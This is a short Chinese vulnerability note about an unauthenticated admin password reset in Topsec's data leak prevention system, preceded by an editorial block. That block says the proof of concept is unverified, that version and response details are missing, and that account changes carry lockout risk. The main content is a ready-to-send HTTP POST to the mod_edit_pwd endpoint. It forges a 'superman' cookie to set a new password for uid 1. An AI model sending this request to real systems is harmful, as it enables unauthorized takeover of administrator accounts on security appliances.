# 天融信数据防泄漏系统越权修改管理员密码

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Topsec数据防泄漏系统
- 本文讨论：auth_user mod_edit_pwd未授权密码修改
- 版本、权限与配置前提：称无需登录，伪造username cookie及uid1；无版本
- 资料类型：无来源改密码短PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- HTTP片段缺版本/Host/Content-Type，只有主张无响应或登录验证
- 默认uid1及任意用户范围未给依据，原始出处未知

### 操作风险与恢复

- 账户操作会新增用户或更改认证材料，可能使原用户失去访问；须核对角色、操作前账户状态及恢复路径

无需登录权限,由于修改密码处未校验原密码,且/?module=auth_user&action=mod_edit_pwd，接口未授权访问,造成直接修改任意用户密 码，默认superman账户uid为1

```
POST /?module=auth_user&action=mod_edit_pwd 
Cookie: username=superman;

uid=1&pd=Newpasswd&mod_pwd=1&dlp_perm=1
```
